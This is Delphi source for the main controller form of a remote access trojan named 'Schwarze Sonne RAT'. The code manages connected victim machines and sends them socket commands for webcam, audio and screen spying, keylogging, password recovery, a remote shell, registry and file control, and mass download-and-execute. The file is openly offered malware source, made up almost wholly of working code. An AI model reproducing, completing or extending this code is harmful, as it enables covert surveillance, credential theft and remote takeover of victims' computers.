{
Schwarze Sonne RAT
Main Coders: Slayer616, counterstrikewi, ap0calypse
Credits: Coolvibes Team, Aphex, Magic and all other guys who helped us with their codes!

You need to use Delphi 2007 for Client and Delphi 7/6/2007 for Server!
}
unit MainU;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ExtCtrls,userv, XPMan, Buttons,
  Menus, ImgList, ShellAPI,WinSock, uTransferView,uScreen, uProcess,uCamspy,uAbout,
  jpeg,uConn, uKeylogger,uFlag,uRegistryeditor,upass,uRemoteshell,udownload,inifiles,uScreenNor, uinformation,uAudioStream;
type
    TPluginRec = packed record
      szName:     string;
      szVersion:  string;
      szAuthor:   string;
      szMutex:    string;
      Call:       procedure(hWindow:pointer; socket:integer; var Strs:pointer); stdcall;
      ReceiveData:procedure(socket:integer; sStringz:string); stdcall;
      sServPluginname:string;
    end;

function OpenThread(dwDesiredAccess: DWord;
                    bInheritHandle: Bool;
                    dwThreadId: DWord): DWord; stdcall; external 'kernel32.dll';

  type
    PluginArray = array of TPluginRec;
type
  TButton = class(StdCtrls.TButton)
    OwnedThread: TThread;
    ProgressBar: TProgressBar;
  end;
 
  TMainForm = class(TForm)
    pm1: TPopupMenu;
    Filemanager1: TMenuItem;
    Processmanager1: TMenuItem;
    il1: TImageList;
    Screenspy1: TMenuItem;
    Windowmanager1: TMenuItem;
    Webcamspy1: TMenuItem;
    Registrymanager1: TMenuItem;
    Server1: TMenuItem;
    Close1: TMenuItem;
    Uninstall1: TMenuItem;
    Screenspy2: TMenuItem;
    PasswordRecovery1: TMenuItem;
    Servicemanager1: TMenuItem;
    MassCommands1: TMenuItem;
    N1: TMenuItem;
    Restart1: TMenuItem;
    lv1: TListView;
    Servicemanager2: TMenuItem;
    Windowmanager2: TMenuItem;
    PngImageList1: TImageList;
    Information1: TMenuItem;
    RemoteShell1: TMenuItem;
    Audiospy1: TMenuItem;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    Panel1: TPanel;
    edt1: TEdit;
    BitBtn5: TBitBtn;
    BitBtn2: TBitBtn;
    BitBtn1: TBitBtn;
    TabSheet3: TTabSheet;
    RefreshWindowofServer1: TMenuItem;
    thumbnailDesktop1: TMenuItem;
    ImgThumbnails: TImageList;
    Report1: TMenuItem;
    Icon1: TMenuItem;
    List1: TMenuItem;
    ViewStyle1: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure Filemanager1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure Screenspy1Click(Sender: TObject);
    procedure Processmanager1Click(Sender: TObject);
    procedure Webcamspy1Click(Sender: TObject);
    procedure Windowmanager1Click(Sender: TObject);
    procedure Close1Click(Sender: TObject);
    procedure Uninstall1Click(Sender: TObject);
    procedure Registrymanager1Click(Sender: TObject);
    procedure Screenspy2Click(Sender: TObject);
    procedure PasswordRecovery1Click(Sender: TObject);
    procedure lv12ColumnClick(Sender: TObject; Column: TListColumn);
    procedure MassCommands1Click(Sender: TObject);
    procedure PluginClick(sender:TObject);
    procedure Restart1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure cxButton1Click(Sender: TObject);
    procedure cxButton2Click(Sender: TObject);
    procedure cxButton5Click(Sender: TObject);
    procedure Servicemanager2Click(Sender: TObject);
    procedure Windowmanager2Click(Sender: TObject);
    procedure Information1Click(Sender: TObject);
    procedure RemoteShell1Click(Sender: TObject);
    procedure Audiospy1Click(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure RefreshWindowofServer1Click(Sender: TObject);
    procedure thumbnailDesktop1Click(Sender: TObject);
    procedure Report1Click(Sender: TObject);
    procedure Icon1Click(Sender: TObject);
    procedure List1Click(Sender: TObject);
  private
  Procedure RefreshThumbnails; // aktif tum pc lerden thumbnail resim isteginde bulunacak
  public
    procedure AddPicture(Li: TListItem; Bmp: TBitmap); // thumbnail desktp icin
  end;

function sKillme(sID:integer):boolean; stdcall;  export;
var
  MainForm: TMainForm;
  ListenThread: TMyThread;
  ColumnToSort: Integer;
  LastSorted: Integer;
  SortDir: Integer;
  TrayIconData: TNotifyIconData;
  PluginName:     function():PChar; stdcall;
  PluginVersion:  function():PChar; stdcall;
  PluginAuthor:  function():PChar; stdcall;
  PluginMutex:  function():PChar; stdcall;
  Plugins:        PluginArray;
  procedure StartListening(sPort:Integer);
implementation

uses uSettings, uFilemanager, uBuild, uPlugin, uProfiles;

{$R *.dfm}




procedure TMainForm.AddPicture(Li: TListItem; Bmp: TBitmap);
begin
  if Li.ImageIndex = 0 then begin

    try
      Li.ImageIndex := ImgThumbnails.Add(Bmp,nil);
    except
    end;

  end else begin

    try
      ImgThumbnails.Replace(Li.ImageIndex,Bmp,nil);
    except
    end;

  end;
end;


Function SendData(Sock: TSocket; Text: String): Integer;
Begin
  result := Send(Sock, Text[1], Length(Text), 0);
End;

Procedure TMainForm.RefreshThumbnails;
var
  i:integer;
  s:tstringlist;
begin
s := tstringlist.Create;
for i := 0 to lv1.Items.Count -1 do begin
    s.Add(lv1.Items.Item[i].SubItems.Strings[0]);
end;
for i := s.Count -1 downto 0 do begin
  sleep(100);
  SendData(StrToInt(s.Strings[i]),'402|'  +'0'  + '|' + s.Strings[i]  + #10);
end;
END;


function sKillme(sID:integer):boolean; stdcall;  export;
var
  sD:cardinal;
begin
sD :=OpenThread($0001,FALSE,sID);
terminatethread(sD,0);
end;
Function GetPluginPath: String;
Begin
  Result := ExtractFilePath(ParamStr(0)) + 'Pluginz\';
  If (Not DirectoryExists(Result)) Then
    CreateDirectory(pChar(Result), NIL);
End;
procedure TMainForm.PluginClick(sender:TObject);
var
  i:integer;
  socket:integer;
  sDatas:string;
begin
  for i := 0 to lv1.Items.Count -1 do begin
    if lv1.Items.Item[i].Selected then begin
       SendData(StrToInt(lv1.Items.Item[i].SubItems.Strings[0]),'88|' + TPluginRec(Plugins[TMenuItem(Sender).Tag]).szMutex  + '|' + inttostr(TMenuItem(Sender).Tag) + '|' + lv1.Items.Item[i].SubItems.Strings[0] +  #10);
       exit;
    end;
  end;
end;
procedure LoadPlugins();
var
  Count:    DWORD;
  NewMenu:  TMenuItem;
  sLists:   TListitem;
  WIN32:    TWin32FindData;
  hFile:    DWORD;
  s:pointer;
  fPointer:function():cardinal; stdcall;
begin
  Count := 0;
  hFile := FindFirstFile(PChar(GetPluginPath + '*'), WIN32);
  if hFile <> 0 then
  begin
    repeat
      if (string(WIN32.cFileName) <> '.') and (WIN32.cFileName <> '..') then begin
      SetLength(Plugins, Count + 1);
      if copy(string(win32.cFileName),length(string(win32.cFileName)) -2,3) = 'dll' then begin
      if fileexists(GetPluginPath + WIN32.cFileName + '.srv') then begin
      Pluginname := GetProcAddress(LoadLibrary(pchar(GetPluginPath + WIN32.cFileName)), 'PluginName');
      Plugins[Count].szName := PluginName;
      Plugins[Count].sServPluginname :=  GetPluginPath + WIN32.cFileName + '.srv';
      PluginVersion := GetProcAddress(LoadLibrary(pchar(GetPluginPath + WIN32.cFileName)), 'PluginVersion');
      Plugins[Count].szVersion := PluginVersion;
      PluginAuthor := GetProcAddress(LoadLibrary(pchar(GetPluginPath + WIN32.cFileName)), 'PluginAuthor');
      Plugins[Count].szAuthor  := PluginAuthor ;
      PluginMutex := GetProcAddress(LoadLibrary(pchar(GetPluginPath + WIN32.cFileName)), 'PluginMutex');
      Plugins[Count].szMutex := PluginMutex;
      Plugins[Count].ReceiveData := GetProcAddress(LoadLibrary(pchar(GetPluginPath + WIN32.cFileName)), 'ReceiveDatas');
      Plugins[Count].Call := GetProcAddress(LoadLibrary(pchar(GetPluginPath + WIN32.cFileName)), 'PluginMain');
      NewMenu := TMenuItem.Create(nil);
      NewMenu.Caption := Plugins[Count].szName;
      NewMenu.OnClick := mainform.PluginClick;
      NewMenu.Tag := Count;
      mainform.pm1.Items.Items[13].Add(newmenu);
      sLists := form15.lv1.Items.Add;
      sLists.Caption := string(win32.cFileName);
      slists.SubItems.Add(PluginName);
      slists.SubItems.Add(PluginAuthor);
      sLists.SubItems.Add(PluginVersion);
      sLists.SubItems.Add(PluginMutex);
      Inc(Count);
      end;
      end;
      end;
    until FindNextFile(hFile, WIN32) = FALSE;
    Windows.FindClose(hFile);
end;
end;

procedure StartListening(sPort:Integer);
begin
try
if ListenThread <> NIL THEN // listen thread nil deðilse terminate edilemez. Bug Fixed
BEGIN
  ListenThread.Suspend;
  ListenThread.Terminate;
END;
except
 Sleep(100);
end;
ListenThread := TMyThread.Create(True);
ListenThread.SetPortTo(sPort);
ListenThread.Resume;
end;
procedure TMainForm.FormCreate(Sender: TObject);
begin
MainForm.Caption := 'Schwarze Sonne 0.8.1 - Connected Users: 0';
TrayIconData.cbSize := SizeOf(TrayIconData);
TrayIconData.Wnd := Handle;
TrayIconData.uID := 0;
TrayIconData.uFlags := 1 + 2 + 4;
TrayIconData.uCallbackMessage := WM_USER + 2;
TrayIconData.hIcon := mainform.Icon.Handle;
StrPCopy(TrayIconData.szTip, 'Schwarze Sonne');
Shell_NotifyIcon(NIM_ADD, @TrayIconData);
IconList := TStringList.Create;
end;

procedure TMainForm.FormDestroy(Sender: TObject);
begin
IconList.Free;
end;



//thanks to the Coders of Coolvibes for this great function
procedure TMainForm.Filemanager1Click(Sender: TObject);
var
  nFileman :TForm2;
  i:integer;
begin
//if lv1.Selected = nil then Exit;
for i := 0 to lv1.Items.Count -1 do begin
if lv1.Items.Item[i].Selected then begin
sleep(10);
if lv1.Items.Item[i].SubItems.Objects[0] = nil then begin
  nFileman := tform2.Create(self);
  nFileman.Caption := 'Filemanager - ' +  lv1.Items.Item[i].SubItems.Strings[2];
  nFileman.stat1.Panels.Items[0].Text := lv1.Items.Item[i].SubItems.Strings[0];
  nFileman.stat1.Panels.Items[1].Text := lv1.Items.Item[i].Caption;
  nFileman.cbb1.Clear;
  lv1.Items.Item[i].SubItems.Objects[0] := nFileman;
  nFileman.Show;
end else begin
   TForm2(lv1.Items.Item[i].SubItems.Objects[0]).Show;
   TForm2(lv1.Items.Item[i].SubItems.Objects[0]).cbb1.Clear;
end;
SendData(StrToInt(lv1.Items.Item[i].SubItems.Strings[0]),'12|1'#10);
end;
end;
end;
procedure TMainForm.FormShow(Sender: TObject);
begin
Form3.Show;
LoadPlugins;
end;

procedure TMainForm.thumbnailDesktop1Click(Sender: TObject);
VAR
  Bmp : TBitmap;
  i,num: integer;
  NOT_ASSIGNED: string;
  CountryCode:String;
begin
  thumbnailDesktop1.Checked := NOT thumbnailDesktop1.Checked;
  if thumbnailDesktop1.Checked=True then
  BEGIN
  if icon1.Checked then lv1.ViewStyle:=vsIcon;
  if Report1.Checked then lv1.ViewStyle:=vsReport;
  if List1.Checked then lv1.ViewStyle:=vsList;

    lv1.LargeImages:=ImgThumbnails;
    lv1.SmallImages := ImgThumbnails;
    ImgThumbnails.Clear;
    ImgThumbnails.Width := 96;  // resim genisligi
    ImgThumbnails.Height := 96; // resim yuksekligi

    Bmp := TBitmap.Create;  // imagelist e bos bir item ekleyelim not assigned icin.
    Bmp.Width := 96;
    Bmp.Height := 96;
    NOT_ASSIGNED := 'Not Assigned';
    num := Bmp.Canvas.TextHeight(NOT_ASSIGNED);
    i := Bmp.Canvas.TextWidth(NOT_ASSIGNED);
    Bmp.Canvas.DrawFocusRect(Bmp.Canvas.ClipRect);
    ImgThumbnails.Add(Bmp,nil);
    Bmp.Free;

    lv1.Items.BeginUpdate;
    for i := 0 to lv1.Items.Count -1 do begin
      Application.ProcessMessages;
      lv1.Items[i].ImageIndex := 0;
    end;
    lv1.Items.EndUpdate;
    RefreshThumbnails;

  END
  ELSE
  BEGIN
    lv1.ViewStyle:=vsReport;
    lv1.SmallImages:=il1;
    lv1.LargeImages:=il1;
   for num := lv1.Items.Count-1 downto 0 do
     begin
          CountryCode := lv1.Items[num].SubItems[3];
          DELETE(CountryCode,1,POS('@',CountryCode)+1);
          lv1.items[num].ImageIndex:=GetFlag(CountryCode);
     end;
  END;
end;

procedure TMainForm.Icon1Click(Sender: TObject);
begin
  icon1.Checked :=True ;
  lv1.ViewStyle:=vsIcon;
  Report1.Checked := False;
  List1.Checked := FalsE;
end;

procedure TMainForm.Information1Click(Sender: TObject);
var
  nInformation :TForm6;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[8] = nil then begin
  nInformation := TForm6.Create(self);
  nInformation.Show;
  nInformation.Caption := 'Information - ' +  lv1.Selected.SubItems.Strings[2];
  nInformation.statusbar1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nInformation.statusbar1.Panels.Items[1].Text := lv1.Selected.Caption;
  nInformation.ListView1.Items.Item[17].SubItems[0] :=  lv1.Selected.SubItems.Strings[3];
  nInformation.ListView1.Items.Item[18].SubItems[0] :=  lv1.Selected.SubItems.Strings[5];
  nInformation.ListView1.Items.Item[20].SubItems[0] :=  lv1.Selected.SubItems.Strings[4];
  nInformation.ListView1.Items.Item[21].SubItems[0] :=  lv1.Selected.SubItems.Strings[6];
  lv1.Selected.SubItems.Objects[8] := nInformation;
  SendData(StrToInt(lv1.Selected.SubItems.Strings[0]),'300|'+ #10);
end else begin
   TForm6(lv1.Selected.SubItems.Objects[8]).Show;
end;
end;

procedure TMainForm.List1Click(Sender: TObject);
begin
  icon1.Checked := False;
  Report1.Checked := False;
  List1.Checked:=True;
  lv1.ViewStyle:=vsList;
end;

procedure TMainForm.Screenspy1Click(Sender: TObject);
var
  nFileman :TForm4;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[1] = nil then begin
  nFileman := tform4.Create(self);
  nFileman.Show;
  nFileman.Caption := 'Screenspy - ' +  lv1.Selected.SubItems.Strings[2];
  nFileman.stat1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nFileman.stat1.Panels.Items[1].Text := lv1.Selected.Caption;
  lv1.Selected.SubItems.Objects[1] := nFileman;
end else begin
   TForm4(lv1.Selected.SubItems.Objects[1]).Show;
end;
end;

procedure TMainForm.Processmanager1Click(Sender: TObject);
var
  nFileman :TForm5;
  i:integer;
begin
for i := 0 to lv1.Items.Count -1 do begin
  if lv1.Items.Item[i].Selected then begin
    if lv1.Items.Item[i].SubItems.Objects[2] = nil then begin
      nFileman := tform5.Create(self);
      nFileman.Show;
      nFileman.Caption := 'Manager - ' +  lv1.Items.Item[i].SubItems.Strings[2];
      nFileman.stat1.Panels.Items[0].Text := lv1.Items.Item[i].SubItems.Strings[0];
      nFileman.stat1.Panels.Items[1].Text := lv1.Items.Item[i].Caption;
      nFileman.pgc1.TabIndex := 0;
      lv1.Items.Item[i].SubItems.Objects[2] := nFileman;
    end else begin
       TForm5(lv1.Items.Item[i].SubItems.Objects[2]).Show;
       TForm5(lv1.Items.Item[i].SubItems.Objects[2]).pgc1.TabIndex := 0;
    end;
  end;
end;
end;

procedure TMainForm.Webcamspy1Click(Sender: TObject);
var
  nFileman :TForm7;
  i:integer;
  t:string;
begin
for i := 0 to lv1.Items.Count -1 do begin
  if lv1.Items.Item[i].Selected then begin
    if lv1.Items.Item[i].SubItems.Objects[3] = nil then begin
      nFileman := tform7.Create(self);
      nFileman.Show;
      nFileman.Caption := 'Webcamspy - ' +  lv1.Items.Item[i].SubItems.Strings[2];
      nFileman.stat1.Panels.Items[0].Text := lv1.Items.Item[i].SubItems.Strings[0];
      nFileman.stat1.Panels.Items[1].Text := lv1.Items.Item[i].Caption;
      nfileman.img1.Enabled := false;
      nfileman.pb1.Enabled := false;
      nfileman.Label1.Enabled := false;
      nFileman.Label2.Enabled := false;;
      nfileman.TrackBar1.Enabled := false;
      nfileman.lbl1.Enabled := false;
      nfileman.cbb1.Enabled := false;
      nFileman.UpDown1.Enabled := false;
      nfileman.PngBitBtn3.Enabled := false;
      nfileman.pngbitbtn1.enabled := false;
      nfileman.pngbitbtn2.enabled := false;
      lv1.Items.Item[i].SubItems.Objects[3] := nFileman;
      t := '29|' + lv1.Items.Item[i].SubItems.Strings[0] + #10;
      send(strtoint(lv1.Items.Item[i].SubItems.Strings[0]),t[1],length(t),0);
    end else begin
      if TForm7(lv1.Items.Item[i].SubItems.Objects[3]).stat1.Panels.Items[2].Text <> '0' then begin
       TForm7(lv1.Items.Item[i].SubItems.Objects[3]).Show;
      end else begin
      nFileman := tform7(lv1.Items.Item[i].SubItems.Objects[3]);
      nfileman.img1.Enabled := false;
      nfileman.pb1.Enabled := false;
      nfileman.Label1.Enabled := false;
      nFileman.Label2.Enabled := false;;
      nfileman.TrackBar1.Enabled := false;
      nfileman.lbl1.Enabled := false;
      nfileman.cbb1.Enabled := false;
      nFileman.UpDown1.Enabled := false;
      nfileman.PngBitBtn3.Enabled := false;
      nfileman.pngbitbtn1.enabled := false;
      nfileman.pngbitbtn2.enabled := false;
      t := '29|' + lv1.Items.Item[i].SubItems.Strings[0] + #10;
      send(strtoint(lv1.Items.Item[i].SubItems.Strings[0]),t[1],length(t),0);
      nFileman.Show;
      end;
    end;
  end;
end;
end;

procedure TMainForm.Windowmanager1Click(Sender: TObject);
var
  nFileman :TForm10;
  i:integer;
begin
for i := 0 to lv1.Items.Count -1 do begin
  if lv1.Items.Item[i].Selected then begin
    if lv1.Items.Item[i].SubItems.Objects[4] = nil then begin
      nFileman := tform10.Create(self);
      nFileman.Show;
      nFileman.Caption := 'Keylogger - ' +  lv1.Items.Item[i].SubItems.Strings[2];
      nFileman.stat1.Panels.Items[0].Text := lv1.Items.Item[i].SubItems.Strings[0];
      nFileman.stat1.Panels.Items[1].Text := lv1.Items.Item[i].Caption;
      lv1.Items.Item[i].SubItems.Objects[4] := nFileman;
      SendData(StrToInt(lv1.Items.Item[i].SubItems.Strings[0]),'31|' + #10)
    end else begin
       TForm10(lv1.Items.Item[i].SubItems.Objects[4]).Show;
    end;
  end;
end;
end;

procedure TMainForm.Audiospy1Click(Sender: TObject);
var
  nFileman :TForm19;
  I:integer;
begin
for i := 0 to lv1.Items.Count -1 do begin
  if lv1.Items.Item[i].Selected then begin
    if lv1.Items.Item[i].SubItems.Objects[10] = nil then begin
      nFileman := tform19.Create(self);
      nFileman.Show;
      nFileman.Caption := 'Audiospy - ' +  lv1.Items.Item[i].SubItems.Strings[2];
      nFileman.stat1.Panels.Items[0].Text := lv1.Items.Item[i].SubItems.Strings[0];
      nFileman.stat1.Panels.Items[1].Text := lv1.Items.Item[i].Caption;
      lv1.Items.Item[i].SubItems.Objects[10] := nFileman;
    end else begin
       TForm19(lv1.Items.Item[i].SubItems.Objects[10]).Show;
    end;

  end;
end;
end;

procedure TMainForm.Close1Click(Sender: TObject);
var
  i:integer;
  s:tstringlist;
begin
s := tstringlist.Create;
for i := 0 to lv1.Items.Count -1 do begin
  if lv1.Items.Item[i].Selected then begin
    s.Add(lv1.Items.Item[i].SubItems.Strings[0]);
  end;
end;
for i := 0 to s.Count -1 do begin
  sleep(100);
  SendData(StrToInt(s.Strings[i]),'33|' + #10);
end;
for i := 0 to s.Count -1 do begin
  sleep(10);
  closesocket(StrToInt(s.Strings[i]));
end;
end;

procedure TMainForm.Uninstall1Click(Sender: TObject);
var
  i:integer;
  s:tstringlist;
begin
s := tstringlist.Create;
for i := 0 to lv1.Items.Count -1 do begin
  if lv1.Items.Item[i].Selected then begin
    s.Add(lv1.Items.Item[i].SubItems.Strings[0]);
  end;
end;
for i := 0 to s.Count -1 do begin
  sleep(100);
  SendData(StrToInt(s.Strings[i]),'34|' + #10);
end;
for i := 0 to s.Count -1 do begin
  sleep(10);
  closesocket(StrToInt(s.Strings[i]));
end;
end;

procedure TMainForm.RefreshWindowofServer1Click(Sender: TObject);
var
  i:integer;
  s:tstringlist;
begin
s := tstringlist.Create;
for i := 0 to lv1.Items.Count -1 do begin
    s.Add(lv1.Items.Item[i].SubItems.Strings[0]);
end;
for i := 0 to s.Count -1 do begin
  sleep(10);
  SendData(StrToInt(s.Strings[i]),'304|' + #10);
end;
end;

procedure TMainForm.Registrymanager1Click(Sender: TObject);
var
  nFileman :TForm11;
  i:integer;
begin
for i := 0 to lv1.Items.Count -1 do begin
  if lv1.Items.Item[i].Selected then begin
    if lv1.Items.Item[i].SubItems.Objects[5] = nil then begin
      nFileman := tform11.Create(self);
      nFileman.Show;
      nFileman.Caption := 'Registryeditor - ' +  lv1.Items.Item[i].SubItems.Strings[2];
      nFileman.stat1.Panels.Items[0].Text := lv1.Items.Item[i].SubItems.Strings[0];
      nFileman.stat1.Panels.Items[1].Text := lv1.Items.Item[i].Caption;
      lv1.Items.Item[i].SubItems.Objects[5] := nFileman;
    end else begin
       TForm11(lv1.Items.Item[i].SubItems.Objects[5]).Show;
    end;
  end;
end;
end;

procedure TMainForm.RemoteShell1Click(Sender: TObject);
var
  nShell :TForm18;
begin
if lv1.Selected = nil then Exit;
if lv1.Selected.SubItems.Objects[9] = nil then begin
  nShell := TForm18.Create(self);
  nShell.Show;
  nShell.Caption := 'Remoteshell - ' +  lv1.Selected.SubItems.Strings[2];
  nShell.statusbar1.Panels.Items[0].Text := lv1.Selected.SubItems.Strings[0];
  nShell.statusbar1.Panels.Items[1].Text := lv1.Selected.Caption;
  lv1.Selected.SubItems.Objects[9] := nShell;
end else begin
   TForm18(lv1.Selected.SubItems.Objects[9]).Show;
end;
end;

procedure TMainForm.Report1Click(Sender: TObject);
begin
icon1.checked := False;
list1.Checked:=False;
Report1.checked := True;
lv1.ViewStyle:=vsReport;
end;

procedure TMainForm.Screenspy2Click(Sender: TObject);
var
  nFileman :TForm12;
  I:integer;
  t:string;
begin
for i := 0 to lv1.Items.Count -1 do begin
  if lv1.Items.Item[i].Selected then begin
    if lv1.Items.Item[i].SubItems.Objects[6] = nil then begin
      nFileman := tform12.Create(self);
      nFileman.Show;
      nFileman.Caption := 'Screenspy - ' +  lv1.Items.Item[i].SubItems.Strings[2];
      nFileman.stat1.Panels.Items[0].Text := lv1.Items.Item[i].SubItems.Strings[0];
      nFileman.stat1.Panels.Items[1].Text := lv1.Items.Item[i].Caption;
      nFileman.Label2.Enabled := false;
      nFileman.pb1.Enabled := false;
      nFileman.img1.Enabled := false;
      nFileman.chk1.Enabled := false;
      nFileman.TrackBar1.Enabled := false;
      nFileman.chk2.Enabled := false;
      nFileman.UpDown1.Enabled := false;
      nFileman.Label1.Enabled := false;
      nFileman.lbl1.Enabled := false;
      nFileman.PngBitBtn1.Enabled := false;
      lv1.Items.Item[i].SubItems.Objects[6] := nFileman;
      t := '50|' + nFileman.Stat1.Panels[0].Text + #10;
      send(strtoint(lv1.Items.Item[i].SubItems.Strings[0]),t[1],length(t),0);
    end else begin
      if TForm12(lv1.Items.Item[i].SubItems.Objects[6]).stat1.Panels.Items[2].Text <> '0' then begin
      TForm12(lv1.Items.Item[i].SubItems.Objects[6]).Show;
      end else begin
      nFileman := TForm12(lv1.Items.Item[i].SubItems.Objects[6]);
      nFileman.Label2.Enabled := false;
      nFileman.pb1.Enabled := false;
      nFileman.img1.Enabled := false;
      nFileman.chk1.Enabled := false;
      nFileman.TrackBar1.Enabled := false;
      nFileman.chk2.Enabled := false;
      nFileman.UpDown1.Enabled := false;
      nFileman.Label1.Enabled := false;
      nFileman.lbl1.Enabled := false;
      nFileman.PngBitBtn1.Enabled := false;
      t := '50|' + nFileman.Stat1.Panels[0].Text + #10;
      send(strtoint(lv1.Items.Item[i].SubItems.Strings[0]),t[1],length(t),0);
      nFileman.Show;
      end;
    end;
    SendData(StrToInt(lv1.Items.Item[i].SubItems.Strings[0]),'115|1'#10);
  end;
end;
end;

procedure TMainForm.PasswordRecovery1Click(Sender: TObject);
var
  nFileman :TForm13;
  i:integer;
begin
for i := 0 to lv1.Items.Count -1 do begin
  if lv1.Items.Item[i].Selected then begin
    if lv1.Items.Item[i].SubItems.Objects[7] = nil then begin
      nFileman := tform13.Create(self);
      nFileman.Show;
      nFileman.Caption := 'Password Recovery - ' +  lv1.Items.Item[i].SubItems.Strings[2];
      nFileman.stat1.Panels.Items[0].Text := lv1.Items.Item[i].SubItems.Strings[0];
      nFileman.stat1.Panels.Items[1].Text := lv1.Items.Item[i].Caption;
      lv1.Items.Item[i].SubItems.Objects[7] := nFileman;
    end else begin
       TForm13(lv1.Items.Item[i].SubItems.Objects[7]).Show;
    end;
  end;
end;
end;

procedure TMainForm.lv12ColumnClick(Sender: TObject; Column: TListColumn);
begin
ColumnToSort := Column.Index;
  if ColumnToSort = LastSorted then
    SortDir := 1 - SortDir
  else
    SortDir := 0;
  LastSorted := ColumnToSort;
  (Sender as TCustomListView).AlphaSort; 
end;

procedure TMainForm.MassCommands1Click(Sender: TObject);
begin
form14.Caption := 'Download & Execute';
form14.Show;
end;

procedure TMainForm.Restart1Click(Sender: TObject);
var
  i:integer;
  s:tstringlist;
begin
s := tstringlist.Create;
for i := 0 to lv1.Items.Count -1 do begin
  if lv1.Items.Item[i].Selected then begin
    s.Add(lv1.Items.Item[i].SubItems.Strings[0]);
  end;
end;
for i := 0 to s.Count -1 do begin
  sleep(100);
  SendData(StrToInt(s.Strings[i]),'94|' + #10);
end;
for i := 0 to s.Count -1 do begin
  sleep(100);
  closesocket(StrToInt(s.Strings[i]));
end;
end;

procedure TMainForm.FormActivate(Sender: TObject);
begin
Form3.Parent := TabSheet2;
Form3.BorderStyle:=BSNONE;
Form3.Align:=AlClient;
Form3.show;

Form15.Parent := TabSheet3;
Form15.BorderStyle:=BSNONE;
Form15.Align:=AlClient;
Form15.show;
end;

procedure TMainForm.FormClose(Sender: TObject; var Action: TCloseAction);
var
  i:integer;
  s:tstringlist;
begin
s := tstringlist.Create;
for i := 0 to lv1.Items.Count -1 do begin
    s.Add(lv1.Items.Item[i].SubItems.Strings[0]);
end;
for i := 0 to s.Count -1 do begin
  sleep(10);
  closesocket(StrToInt(s.Strings[i]));
end;
Shell_NotifyIcon(NIM_DELETE, @TrayIconData);
exitprocess(0);
end;

procedure TMainForm.cxButton1Click(Sender: TObject);
begin
form16.show;
end;

procedure TMainForm.cxButton2Click(Sender: TObject);
var
  Ini: TIniFile;
begin
  try
    Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Settings.ini');
    with form1 do
    begin
      edt1.Text := Ini.ReadString('Options', 'Port', '1005');
      edt2.Text := Ini.ReadString('Options', 'Password', 'password');
      checkbox1.Checked := ini.ReadBool('Options','Notify',false); 
    end;
  finally
    Ini.Free;
  end;
  Form1.FormStyle:=fsStayOnTop; // her zaman ustte kalmasini saglar;
  form1.show;
end;

procedure TMainForm.cxButton5Click(Sender: TObject);
begin
Form8.Show;
end;

procedure TMainForm.Servicemanager2Click(Sender: TObject);
var
  nFileman :TForm5;
  i:integer;
begin
for i := 0 to lv1.Items.Count -1 do begin
  if lv1.Items.Item[i].Selected then begin
    if lv1.Items.Item[i].SubItems.Objects[2] = nil then begin
      nFileman := tform5.Create(self);
      nFileman.Show;
      nFileman.Caption := 'Manager - ' +  lv1.Items.Item[i].SubItems.Strings[2];
      nFileman.stat1.Panels.Items[0].Text := lv1.Items.Item[i].SubItems.Strings[0];
      nFileman.stat1.Panels.Items[1].Text := lv1.Items.Item[i].Caption;
      nFileman.pgc1.TabIndex := 2;
      lv1.Items.Item[i].SubItems.Objects[2] := nFileman;
    end else begin
       TForm5(lv1.Items.Item[i].SubItems.Objects[2]).Show;
       TForm5(lv1.Items.Item[i].SubItems.Objects[2]).pgc1.TabIndex := 2;
    end;
  end;
end;
end;

procedure TMainForm.Windowmanager2Click(Sender: TObject);
var
  nFileman :TForm5;
  i:integer;
begin
for i := 0 to lv1.Items.Count -1 do begin
  if lv1.Items.Item[i].Selected then begin
    if lv1.Items.Item[i].SubItems.Objects[2] = nil then begin
      nFileman := tform5.Create(self);
      nFileman.Show;
      nFileman.Caption := 'Manager - ' +  lv1.Items.Item[i].SubItems.Strings[2];
      nFileman.stat1.Panels.Items[0].Text := lv1.Items.Item[i].SubItems.Strings[0];
      nFileman.stat1.Panels.Items[1].Text := lv1.Items.Item[i].Caption;
      nFileman.pgc1.TabIndex := 1;
      lv1.Items.Item[i].SubItems.Objects[2] := nFileman;
    end else begin
       TForm5(lv1.Items.Item[i].SubItems.Objects[2]).Show;
       TForm5(lv1.Items.Item[i].SubItems.Objects[2]).pgc1.TabIndex := 1;
    end;
  end;
end;
end;

end.


